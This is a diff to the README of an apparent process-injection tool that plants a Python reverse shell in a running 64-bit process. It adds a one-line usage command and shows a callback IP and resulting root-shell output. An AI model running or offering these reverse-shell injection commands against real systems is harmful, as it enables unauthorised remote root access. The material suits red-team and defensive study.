@@ -41,6 +41,16 @@ Based from: https://github.com/David-Reguera-Garcia-Dreg/python_reverse_shell_de
 
 Steps for **64 bit process**:
 
+#### Using pyrev64.sh script
+
+Just execute **./drx PID $(./pyrev64.sh IP PORT)**
+
+```
+./drx 2904 $(./pyrev64.sh 127.0.0.1 3456)
+```
+
+#### By hand way
+
 Generate IP str, for ex 51.195.45.136
 ```
 export IP_ADDR=51.195.45.136
@@ -112,4 +122,4 @@ uid=0(root) gid=0(root) groups=0(root)
 ```
 
 # Contributors
-* micronn, pyrev64.sh - https://github.com/micronn https://twitter.com/micronn386?lang=en
+* micronn: pyrev64.sh - https://github.com/micronn https://twitter.com/micronn386
